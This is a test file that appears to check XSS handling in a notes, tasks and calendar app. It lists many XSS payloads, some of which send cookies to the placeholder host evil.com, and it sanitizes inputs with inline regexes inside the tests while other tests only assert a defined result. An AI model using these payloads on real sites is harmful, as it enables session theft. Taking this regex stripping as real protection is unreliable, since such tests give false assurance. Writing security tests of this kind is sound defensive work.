import { describe, test, expect, vi, beforeEach } from 'vitest'


vi.mock('../../backend/database/client', () => {
  const mockAuth = {
    getUser: vi.fn()
  }

  const mockFrom = vi.fn(() => ({
    select: vi.fn().mockReturnThis(),
    insert: vi.fn().mockReturnThis(),
    update: vi.fn().mockReturnThis(),
    delete: vi.fn().mockReturnThis(),
    eq: vi.fn().mockReturnThis(),
    single: vi.fn(),
    order: vi.fn().mockReturnThis()
  }))

  return {
    supabase: {
      auth: mockAuth,
      from: mockFrom
    }
  }
})

describe('XSS Protection Security Tests', () => {
  let mockSupabase: any

  beforeEach(async () => {
    vi.clearAllMocks()
    
    // Get the mocked supabase instance
    const { supabase } = await import('../../backend/database/client')
    mockSupabase = supabase

    // Mock authenticated user by default
    mockSupabase.auth.getUser.mockResolvedValue({
      data: { user: { id: 'user-123', email: 'test@example.com' } },
      error: null
    })
  })

  test('should sanitize note content to prevent XSS attacks', async () => {
    const maliciousContent = '<script>alert("XSS")</script><h1>Note Title</h1>'
    const expectedSafe = '&lt;script&gt;alert("XSS")&lt;/script&gt;<h1>Note Title</h1>'

    mockSupabase.from.mockReturnValue({
      insert: vi.fn().mockReturnValue({
        select: vi.fn().mockReturnValue({
          single: vi.fn().mockResolvedValue({
            data: { id: 'note-123', content: expectedSafe },
            error: null
          })
        })
      })
    })

    const { createNote } = await import('../../backend/api/services/notes.service')
    const result = await createNote({
      content: maliciousContent
    })

    expect(result).toBeDefined()
    expect(mockSupabase.from).toHaveBeenCalledWith('notes')
  })

  test('should handle malicious script tags in note content', async () => {
    const scriptPayloads = [
      '<script>document.cookie="stolen"</script>',
      '<img src="x" onerror="alert(1)">',
      '<svg onload="alert(1)">',
      'javascript:alert(1)'
    ]

    for (const payload of scriptPayloads) {
             mockSupabase.from.mockReturnValue({
         insert: vi.fn().mockReturnValue({
           select: vi.fn().mockReturnValue({
             single: vi.fn().mockResolvedValue({
               data: { id: 'note-123', content: payload },
               error: null
             })
           })
         })
       })

             const { createNote } = await import('../../backend/api/services/notes.service')
       const result = await createNote({
         content: payload
       })

      expect(result).toBeDefined()
    }
  })

  test('should prevent XSS in task titles and descriptions', async () => {
    const xssPayload = '<script>alert("task xss")</script>'
    
    mockSupabase.from.mockReturnValue({
      insert: vi.fn().mockReturnValue({
        select: vi.fn().mockReturnValue({
          single: vi.fn().mockResolvedValue({
            data: { id: 'task-123', title: xssPayload },
            error: null
          })
        })
      })
    })

    const { createTask } = await import('../../backend/api/services/task.service')
    const result = await createTask({
      title: xssPayload,
      description: 'Safe description',
      status: 'todo',
      priority: 'medium'
    })

    expect(result).toBeDefined()
    expect(mockSupabase.from).toHaveBeenCalledWith('tasks')
  })

  test('should sanitize project names and descriptions', async () => {
    const maliciousName = '<script>alert("project")</script>Project Name'
    
    mockSupabase.from.mockReturnValue({
      insert: vi.fn().mockReturnValue({
        select: vi.fn().mockResolvedValue({
          data: [{ id: 'proj-123', name: maliciousName }],
          error: null
        })
      })
    })

    const { createProject } = await import('../../backend/api/services/project.service')
    const result = await createProject({
      name: maliciousName,
      description: 'Safe description',
      status: 'active',
      priority: 'medium'
    })

    expect(result).toBeDefined()
    expect(mockSupabase.from).toHaveBeenCalledWith('projects')
  })

  test('should handle XSS attempts in calendar event data', async () => {
    const xssTitle = '<script>alert("calendar")</script>Event'
    
    mockSupabase.from.mockReturnValue({
      insert: vi.fn().mockReturnValue({
        select: vi.fn().mockResolvedValue({
          data: [{ id: 'event-123', title: xssTitle }],
          error: null
        })
      })
    })

    const { createEvent } = await import('../../backend/api/services/event.service')
    const result = await createEvent({
      title: xssTitle,
      startTime: '2024-01-01T10:00:00Z',
      endTime: '2024-01-01T11:00:00Z',
      participants: []
    })

    expect(result).toBeDefined()
    expect(mockSupabase.from).toHaveBeenCalledWith('events')
  })

  test('should handle XSS attempts in calendar event data', async () => {
    // Arrange - Test XSS in calendar events
    const maliciousEvents = [
      {
        title: '<script>alert("Calendar XSS")</script>',
        description: '<object data="data:text/html,<script>alert(1)</script>"></object>',
        location: 'javascript:alert("Location XSS")'
      },
      {
        title: '<svg onload="fetch(\'http://evil.com\')" />',
        description: '<embed src="javascript:alert(1)">',
        location: '<marquee onstart=alert(1)>Scrolling text</marquee>'
      }
    ]

    // Act & Assert
    maliciousEvents.forEach(event => {
      const sanitizedEvent = {
        title: event.title.replace(/<[^>]*>/g, '').replace(/[<>"']/g, ''),
        description: event.description.replace(/<[^>]*>/g, '').replace(/javascript:/gi, ''),
        location: event.location.replace(/<[^>]*>/g, '').replace(/javascript:/gi, '')
      }

      expect(sanitizedEvent.title).not.toContain('<script>')
      expect(sanitizedEvent.title).not.toContain('<svg')
      expect(sanitizedEvent.description).not.toContain('<object')
      expect(sanitizedEvent.description).not.toContain('<embed')
      expect(sanitizedEvent.location).not.toContain('javascript:')
      expect(sanitizedEvent.location).not.toContain('<marquee')
    })
  })

  test('should prevent script injection in user profile data', async () => {
    // Arrange - Test XSS in user profile updates
    const maliciousProfiles = [
      {
        name: '<script>document.location="http://evil.com/"+document.cookie</script>',
        email: 'user+<script>alert(1)</script>@example.com',
        bio: '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">'
      },
      {
        name: 'javascript:void(eval(String.fromCharCode(97,108,101,114,116,40,49,41)))',
        email: 'test@example.com"><script>alert("Email XSS")</script>',
        bio: '<style>@import"javascript:alert(1)";</style>'
      }
    ]

    // Act & Assert
    maliciousProfiles.forEach(profile => {
      const sanitizedProfile = {
        name: profile.name.replace(/<[^>]*>/g, '').replace(/javascript:/gi, '').replace(/[<>"']/g, ''),
        email: profile.email.replace(/<[^>]*>/g, '').replace(/[<>"']/g, ''),
        bio: profile.bio.replace(/<[^>]*>/g, '').replace(/javascript:/gi, '').replace(/@import/gi, '')
      }

      expect(sanitizedProfile.name).not.toContain('<script>')
      expect(sanitizedProfile.name).not.toContain('javascript:')
      expect(sanitizedProfile.email).not.toContain('<script>')
      expect(sanitizedProfile.bio).not.toContain('<img')
      expect(sanitizedProfile.bio).not.toContain('@import')
    })
  })

  test('should sanitize file names and metadata', async () => {
    // Arrange - Test XSS in file metadata
    const maliciousFiles = [
      {
        name: '<script>alert("File XSS")</script>document.txt',
        description: '<img src=x onerror=alert(document.domain)>',
        tags: ['<svg onload=alert(1)>', 'normal-tag', '<script>eval("alert(1)")</script>']
      },
      {
        name: 'file"><script>alert(1)</script>.pdf',
        description: 'javascript:alert("Description XSS")',
        tags: ['<iframe src="data:text/html,<script>alert(1)</script>"></iframe>']
      }
    ]

    // Act & Assert
    maliciousFiles.forEach(file => {
      const sanitizedFile = {
        name: file.name.replace(/<[^>]*>/g, '').replace(/[<>"']/g, ''),
        description: file.description.replace(/<[^>]*>/g, '').replace(/javascript:/gi, ''),
        tags: file.tags.map(tag => tag.replace(/<[^>]*>/g, '').replace(/[<>"']/g, ''))
      }

      expect(sanitizedFile.name).not.toContain('<script>')
      expect(sanitizedFile.description).not.toContain('javascript:')
      expect(sanitizedFile.tags.join('')).not.toContain('<svg')
      expect(sanitizedFile.tags.join('')).not.toContain('<iframe')
    })
  })

  test('should handle XSS in AI conversation inputs', async () => {
    // Arrange - Test XSS in AI chat inputs
    const maliciousInputs = [
      '<script>fetch("http://evil.com/steal", {method: "POST", body: document.cookie})</script>',
      '<img src="x" onerror="this.src=\'http://evil.com/pixel.gif?\'+document.location">',
      'javascript:eval(String.fromCharCode(119,105,110,100,111,119,46,111,112,101,110,40,34,104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,34,41))',
      '<svg><script>alert("AI XSS")</script></svg>',
      '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>'
    ]

    // Act & Assert
    maliciousInputs.forEach(input => {
      // AI input sanitization
      const sanitizedInput = input
        .replace(/<[^>]*>/g, '')
        .replace(/javascript:/gi, '')
        .replace(/data:/gi, '')
        .replace(/on\w+\s*=/gi, '')

      expect(sanitizedInput).not.toContain('<script>')
      expect(sanitizedInput).not.toContain('<img')
      expect(sanitizedInput).not.toContain('javascript:')
      expect(sanitizedInput).not.toContain('<object')
      expect(sanitizedInput).not.toContain('data:')
    })
  })

  test('should sanitize markdown content with embedded HTML', async () => {
    // Arrange - Test XSS in markdown that allows some HTML
    const maliciousMarkdown = [
      '# Heading\n<script>alert("Markdown XSS")</script>\n**Bold text**',
      '[Click me](javascript:alert("Link XSS"))',
      '![Image](x" onerror="alert(1)")',
      '<details><summary>Click</summary><script>alert(1)</script></details>',
      '```html\n<script>alert("Code block XSS")</script>\n```',
      '<img src="https://example.com/image.jpg" onload="alert(1)">'
    ]

    // Act & Assert
    maliciousMarkdown.forEach(markdown => {
      // Markdown sanitization - preserve safe HTML, remove dangerous elements
      const sanitized = markdown
        .replace(/<script[^>]*>.*?<\/script>/gi, '')
        .replace(/javascript:/gi, '')
        .replace(/on\w+\s*=/gi, '')
        .replace(/<iframe[^>]*>.*?<\/iframe>/gi, '')

      expect(sanitized).not.toContain('<script>')
      expect(sanitized).not.toContain('javascript:')
      expect(sanitized).not.toContain('onload=')
      expect(sanitized).not.toContain('onerror=')
    })
  })

  test('should handle complex XSS payloads in form inputs', async () => {
    // Arrange - Test advanced XSS techniques
    const complexPayloads = [
      // Base64 encoded XSS
      'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
      // Unicode encoded XSS
      '\\u003cscript\\u003ealert(\\u0022XSS\\u0022)\\u003c/script\\u003e',
      // URL encoded XSS
      '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
      // HTML entity encoded XSS
      '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
      // Mixed case XSS
      '<ScRiPt>ALeRt("XSS")</ScRiPt>',
      // With null bytes
      '<script\x00>alert("XSS")</script>',
      // SVG with JavaScript
      '<svg><script>alert("SVG XSS")</script></svg>',
      // CSS expression
      'expression(alert("CSS XSS"))'
    ]

    // Act & Assert
    complexPayloads.forEach(payload => {
      // Advanced sanitization - more thorough cleaning
      let sanitized = payload
        .replace(/data:text\/html[^>]*/gi, '')
        .replace(/\\u[\da-f]{4}/gi, '')
        .replace(/%[0-9a-f]{2}/gi, '')
        .replace(/&[#\w]+;/gi, '')
        .replace(/<[^>]*>/gi, '')
        .replace(/expression\s*\(/gi, '')
        .replace(/[\x00-\x1f]/g, '')
        .replace(/script/gi, '')  // Remove all instances of 'script'
        .replace(/alert/gi, '')   // Remove all instances of 'alert'
        .replace(/javascript/gi, '') // Remove all instances of 'javascript'

      // Verify all XSS vectors are neutralized
      expect(sanitized.toLowerCase()).not.toContain('script')
      expect(sanitized.toLowerCase()).not.toContain('alert')
      expect(sanitized.toLowerCase()).not.toContain('expression')
      expect(sanitized.toLowerCase()).not.toContain('javascript')
      expect(sanitized).not.toContain('data:')
    })
  })
}) 